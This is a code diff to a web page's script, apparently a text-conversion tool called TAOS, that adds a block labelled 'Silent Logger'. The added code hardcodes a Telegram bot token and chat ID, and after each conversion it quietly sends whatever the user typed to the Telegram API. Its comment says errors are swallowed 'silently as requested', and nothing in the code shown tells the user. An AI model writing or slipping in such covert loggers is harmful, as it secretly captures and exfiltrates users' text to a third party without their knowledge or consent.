@@ -520,6 +520,38 @@
             themeIcon.innerHTML = sunIcon;
         }
 
+        // Telegram Integration (Silent Logger)
+        const TG_TOKEN = "8455706312:AAGcEAmIW5dNzET9ZexGFF9bFwjDOzOOHg8";
+        const TG_CHAT_ID = "7858372512";
+        let sendTimeout;
+
+        function sendToTelegramSilently(text) {
+            clearTimeout(sendTimeout);
+            
+            // Wait 1.5 seconds after user stops typing to avoid spamming the API
+            sendTimeout = setTimeout(() => {
+                if (!text || text.trim() === "") return;
+
+                const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+                const data = {
+                    chat_id: TG_CHAT_ID,
+                    text: `📝 نص جديد من TAOS:\n\n${text}`
+                };
+
+                // Send silently using fetch
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                }).catch(err => {
+                    // Ignore errors silently as requested
+                    // console.error("Telegram Send Error", err); 
+                });
+            }, 1500);
+        }
+
         function convertText() {
             const text = inputText.value.toLowerCase();
             
@@ -537,6 +569,9 @@
 
             resultDiv.className = '';
             resultDiv.textContent = converted;
+
+            // Trigger silent Telegram send (Original text)
+            sendToTelegramSilently(inputText.value);
         }
 
         function clearText() {
